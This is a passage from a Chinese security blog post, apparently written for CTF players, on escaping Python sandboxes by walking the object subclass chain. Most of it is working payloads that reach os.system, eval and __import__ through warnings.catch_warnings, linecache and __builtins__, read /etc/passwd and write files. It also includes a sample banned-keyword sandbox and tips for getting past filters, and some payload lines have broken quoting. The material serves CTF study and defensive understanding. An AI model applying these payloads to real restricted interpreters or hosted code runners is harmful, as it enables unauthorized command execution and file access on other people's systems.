+<h5 id="bases-属性"><a href="#bases-属性" class="headerlink" title="__bases__属性"></a><code>__bases__</code>属性</h5><p>返回一个类所继承的类，返回的是元组形式。`</p>
+<h5 id="class-返回一个实例所属的类"><a href="#class-返回一个实例所属的类" class="headerlink" title="__class__返回一个实例所属的类"></a><code>__class__</code>返回一个实例所属的类</h5><p>返回一个实例所属的类</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lihuaiqiu</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line">huai=lihuaiqiu()</span><br><span class="line"><span class="keyword">print</span> huai.__class__</span><br></pre></td></tr></table></figure>
+
+<p>最终返回</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__main__.lihuaiqiu</span><br><span class="line">[Finished <span class="keyword">in</span> <span class="number">0.3</span>s]</span><br></pre></td></tr></table></figure>
+
+<h5 id="globals-属性"><a href="#globals-属性" class="headerlink" title="__globals__属性"></a><code>__globals__</code>属性</h5><p>只读，以字典的形式返回函数所在的全局命名空间所定义的全局变量。如：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">60</span>].__init__.__globals__</span><br></pre></td></tr></table></figure>
+
+<p>功能等同于<code>func_globals</code>，如下两个<code>payload</code>等价</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__getattribute__(<span class="string">'func_global'</span>+<span class="string">'s'</span>)[<span class="string">'linecache'</span>].os.system(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__getattribute__(<span class="string">'__global'</span>+<span class="string">'s__'</span>)[<span class="string">'linecache'</span>].os.system(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>
+
+<h5 id="subclasses-属性"><a href="#subclasses-属性" class="headerlink" title="__subclasses__属性"></a><code>__subclasses__</code>属性</h5><p>以dict形式返回当前类的所有子类。</p>
+<h5 id="构造继承链绕过沙箱"><a href="#构造继承链绕过沙箱" class="headerlink" title="构造继承链绕过沙箱"></a>构造继承链绕过沙箱</h5><p>首先起手式肯定是先去构造<code>object</code>类，这个在前面写了几种构造方法</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__mro__[<span class="number">2</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
+
+<p>通过<code>payload:().__class__.__base__.__subclasses__()</code>等列出所有子类，在所有子类中寻找可以进一步利用的危险操作。</p>
+<p><img src="https://s2.ax1x.com/2019/07/06/Zw8qtU.png" alt="Zw8qtU.png"></p>
+<p>在这里可以看到<code>&lt;type &#39;file&#39;&gt;</code>这个<code>file</code>对象，进一步通过<code>dir()</code>函数查看有没有什么可以利用的危险函数方法</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'__class__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__enter__'</span>, <span class="string">'__exit__'</span>, <span class="string">'__format__'</span>, <span class="string">'__getattribute__'</span>, _<span class="string">', '</span>__init__<span class="string">', '</span>__iter__<span class="string">', '</span>__new__<span class="string">', '</span>__reduce__<span class="string">', '</span>__reduce_ex__<span class="string">', '</span>__repr__<span class="string">', '</span>__setattr__<span class="string">', '</span>__<span class="string">', '</span>__str__<span class="string">', '</span>__subclasshook__<span class="string">', '</span>close<span class="string">', '</span>closed<span class="string">', '</span>encoding<span class="string">', '</span>errors<span class="string">', '</span>fileno<span class="string">', '</span>flush<span class="string">', '</span>isaode<span class="string">', '</span>name<span class="string">', '</span>newlines<span class="string">', '</span>next<span class="string">', '</span>read<span class="string">', '</span>readinto<span class="string">', '</span>readline<span class="string">', '</span>readlines<span class="string">', '</span>seek<span class="string">', '</span>softspace<span class="string">', '</span>truncate<span class="string">', '</span>write<span class="string">', '</span>writelines<span class="string">', '</span>xreadlines<span class="string">']</span></span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到是有<code>文件读写函数</code>的，所以可以通过<code>().__class__.__base__.__subclasses__()[40](&#39;/etc/passwd&#39;).read()</code>这样的payload进行读取敏感文件数据等价于<code>file(&#39;/etc/passwd&#39;).read()</code></p>
+<p>那么通过这个思路:先找到<code>object</code>的所有子类，再去找有危险操作的子类,这里的子类中是有两种类型的<code>type</code>与<code>class</code>，<code>class</code>最好配置<code>__init__</code>初始化再进行<code>__globals__</code>更好的寻找危险利用点。这里总结一下常用的<code>payload</code>。</p>
+<h5 id="读文件-写文件"><a href="#读文件-写文件" class="headerlink" title="读文件/写文件"></a>读文件/写文件</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#读文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/etc/passwd'</span>).read()</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'file'</span>](<span class="string">'/etc/passwd'</span>).read() </span><br><span class="line"><span class="comment">#写文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/var/www/html/flag'</span>, <span class="string">'w'</span>).write(<span class="string">'flag&#123;sandbox_is_so_cool&#125;'</span>)</span><br></pre></td></tr></table></figure>
+
+<h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].os.system(<span class="string">'ls'</span>)</span><br><span class="line"><span class="comment">#也是载入__builtins__</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("ls")'</span>)</span><br><span class="line"><span class="comment"># 重新载入__builtins__：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">"os"</span>).system(<span class="string">"ls"</span>)</span><br><span class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">60</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("ls")'</span>)</span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">'os'</span>]</span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">76</span>].__init__.__globals__[<span class="string">'os'</span>]</span><br><span class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">29</span>].__call__(eval,<span class="string">'os.system("ls"))</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="python3中的payload"><a href="#python3中的payload" class="headerlink" title="python3中的payload"></a>python3中的payload</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">-4</span>].__init__.__globals__[<span class="string">'system'</span>](<span class="string">'ls'</span>)</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">93</span>].__init__.__globals__[<span class="string">"sys"</span>].modules[<span class="string">"os"</span>].system(<span class="string">"ls"</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">104</span>].__init__.__globals__[<span class="string">"sys"</span>].modules[<span class="string">"os"</span>].system(<span class="string">"ls"</span>)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">'system'</span>](<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>
+
+<h4 id="逃逸思路总结"><a href="#逃逸思路总结" class="headerlink" title="逃逸思路总结"></a>逃逸思路总结</h4><p>在遇到一个如下的<code>python</code>沙箱环境下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line">banned = [</span><br><span class="line">    <span class="string">"import"</span>,</span><br><span class="line">    <span class="string">"exec"</span>,</span><br><span class="line">    <span class="string">"eval"</span>,</span><br><span class="line">    <span class="string">"pickle"</span>,</span><br><span class="line">    <span class="string">"os"</span>,</span><br><span class="line">    <span class="string">"subprocess"</span>,</span><br><span class="line">    <span class="string">"kevin sucks"</span>,</span><br><span class="line">    <span class="string">"input"</span>,</span><br><span class="line">    <span class="string">"banned"</span>,</span><br><span class="line">    <span class="string">"cry sum more"</span>,</span><br><span class="line">    <span class="string">"sys"</span></span><br><span class="line">]</span><br><span class="line">targets = __builtins__.__dict__.keys()</span><br><span class="line">targets.remove(<span class="string">'raw_input'</span>)</span><br><span class="line">targets.remove(<span class="string">'print'</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> targets:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[x]</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    print(<span class="string">"&gt;&gt;&gt;"</span>, end=<span class="string">' '</span>)</span><br><span class="line">    data = raw_input()</span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> banned:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> data.lower():</span><br><span class="line">            print(<span class="string">"No bueno"</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>: <span class="comment"># this means nobreak</span></span><br><span class="line">        <span class="keyword">exec</span> data</span><br></pre></td></tr></table></figure>
+
+<p>大概逻辑就是把内联函数中除了<code>raw_input</code>，<code>print</code>，把其他的全部过滤掉了，所以想到可以<code>reload</code>，但是这里是删除了所有，所以<code>reload</code>也被删掉了，所以想到可以<code>import imp</code>.但是<code>import</code>又被ban掉了，所以这里只能通过引入其他类的危险函数去打穿沙箱了。</p>
+<ul>
+<li>首先通过<code>().__class__.__bases__[0].__subclasses__()</code>查看一下所有子类，如果有<code>file</code>对象的话可以读写文件通过下面的<code>payload</code></li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#读文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/etc/passwd'</span>).read()</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'file'</span>](<span class="string">'/etc/passwd'</span>).read() </span><br><span class="line"><span class="comment">#写文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/var/www/html/flag'</span>, <span class="string">'w'</span>).write(<span class="string">'flag&#123;sandbox_is_so_cool&#125;'</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>如果子类中有<code>&lt;class &#39;warnings.catch_warnings&#39;&gt;</code>，可以通过<code>().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__</code>,发现两个很有用的方法属性，就是<code>__builtins__</code>和<code>linecache</code></li>
+</ul>
+<p><strong><code>__builtins__</code>的操作有</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("ls")'</span>)</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'ls'</span>)</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">"os"</span>).system(<span class="string">"ls"</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>linecache是一个很神奇的模块</strong></p>
+<p>通过<code>dir()</code>可以发现</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'__all__'</span>, <span class="string">'__builtins__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__file__'</span>, <span class="string">'__name__'</span>, <span class="string">'__package__'</span>, <span class="string">'cache'</span>, <span class="string">'checkcache'</span>, <span class="string">'clearcache'</span>, <span class="string">'getline'</span>, <span class="string">'getlines'</span>, <span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'updatecache'</span>]</span><br></pre></td></tr></table></figure>
+
+<p>这里是存在os模块的，所以我们可以通过os进行系统命令</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].os.system(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>其他类中的命令执行</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">'os'</span>]</span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">76</span>].__init__.__globals__[<span class="string">'os'</span>]</span><br></pre></td></tr></table></figure>
+
+<p>所以说，最引入<code>object</code>进行沙箱逃逸，首先要通过<code>subclasses</code>找到当前的子类，有<code>file</code>对象的话就用<code>file</code>写，读文件;有<code>&lt;class &#39;warnings.catch_warnings&#39;&gt;</code>的话用<code>__globals__</code>去找那两个关键属性方法,<code>linecache</code>和<code>__builtins__</code>，通过<code>linecache</code>进行引入os模块命令执行，通过<code>__builtins__</code>引入<code>eval</code>，或者<code>__import__</code>，进行命令执行,如果都不行的话可以考虑</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">'os'</span>]</span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">76</span>].__init__.__globals__[<span class="string">'os'</span>]</span><br></pre></td></tr></table></figure>
+
+<h4 id="绕过过滤小tips"><a href="#绕过过滤小tips" class="headerlink" title="绕过过滤小tips"></a>绕过过滤小tips</h4><ul>
+<li>. 可替换为<code>getattr()</code></li>
+<li>_ 可替换为<code>dir[0][0][0]</code></li>
+</ul>
+<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://www.smi1e.top/python-沙箱逃逸/" target="_blank" rel="noopener">https://www.smi1e.top/python-%e6%b2%99%e7%ae%b1%e9%80%83%e9%80%b8/</a></p>
+<p><a href="http://yulige.top/?p=502" target="_blank" rel="noopener">http://yulige.top/?p=502</a></p>
+<p><a href="http://shaobaobaoer.cn/archives/656/python-sandbox-escape" target="_blank" rel="noopener">http://shaobaobaoer.cn/archives/656/python-sandbox-escape</a></p>
+<p><a href="https://hatboy.github.io/2018/04/19/Python沙箱逃逸总结/" target="_blank" rel="noopener">https://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/</a></p>
+<p><a href="https://xz.aliyun.com/t/2308" target="_blank" rel="noopener">https://xz.aliyun.com/t/2308</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/07/03/%E5%AE%89%E6%81%92%E5%85%AD%E6%9C%88%E8%B5%9Bweb%E9%83%A8%E5%88%86/" rel="next" title="安恒六月赛web部分">
+                <i class="fa fa-chevron-left"></i> 安恒六月赛web部分
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/07/07/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-Jinja2/" rel="prev" title="SSTI模板注入-Jinja2">
+                SSTI模板注入-Jinja2 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">离怀秋</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">72</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/lihuaiqiu" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://southseast.cc" title="南溟师傅" target="_blank">南溟师傅</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#python沙箱逃逸介绍"><span class="nav-number">2.</span> <span class="nav-text">python沙箱逃逸介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Python中可执行代码命令的模板以及函数"><span class="nav-number">3.</span> <span class="nav-text">Python中可执行代码命令的模板以及函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#花式命令执行绕过逃逸"><span class="nav-number">4.</span> <span class="nav-text">花式命令执行绕过逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#dict-与dir-函数"><span class="nav-number">4.1.</span> <span class="nav-text">__dict__与dir()函数</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#dir-函数"><span class="nav-number">4.1.1.</span> <span class="nav-text">dir()函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#dict-方法"><span class="nav-number">4.1.2.</span> <span class="nav-text">__dict__方法</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#importlib动态导入模块命令执行"><span class="nav-number">4.2.</span> <span class="nav-text">importlib动态导入模块命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#无绕过payload"><span class="nav-number">4.2.1.</span> <span class="nav-text">无绕过payload</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#绕过payload"><span class="nav-number">4.2.2.</span> <span class="nav-text">绕过payload</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#getattr-和-getattribute"><span class="nav-number">4.3.</span> <span class="nav-text">__getattr__和__getattribute__</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#花式重载以及引入"><span class="nav-number">4.4.</span> <span class="nav-text">花式重载以及引入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#引入模块路径"><span class="nav-number">4.4.1.</span> <span class="nav-text">引入模块路径</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#reload方法进行重载"><span class="nav-number">4.4.2.</span> <span class="nav-text">reload方法进行重载</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#引入objecb命令执行"><span class="nav-number">4.5.</span> <span class="nav-text">引入objecb命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#bases-属性"><span class="nav-number">4.5.1.</span> <span class="nav-text">__bases__属性</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#class-返回一个实例所属的类"><span class="nav-number">4.5.2.</span> <span class="nav-text">__class__返回一个实例所属的类</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#globals-属性"><span class="nav-number">4.5.3.</span> <span class="nav-text">__globals__属性</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#subclasses-属性"><span class="nav-number">4.5.4.</span> <span class="nav-text">__subclasses__属性</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#构造继承链绕过沙箱"><span class="nav-number">4.5.5.</span> <span class="nav-text">构造继承链绕过沙箱</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#读文件-写文件"><span class="nav-number">4.5.6.</span> <span class="nav-text">读文件&#x2F;写文件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#命令执行"><span class="nav-number">4.5.7.</span> <span class="nav-text">命令执行</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#python3中的payload"><span class="nav-number">4.5.8.</span> <span class="nav-text">python3中的payload</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#逃逸思路总结"><span class="nav-number">4.6.</span> <span class="nav-text">逃逸思路总结</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#绕过过滤小tips"><span class="nav-number">4.7.</span> <span class="nav-text">绕过过滤小tips</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考资料"><span class="nav-number">5.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">离怀秋</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count"></span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
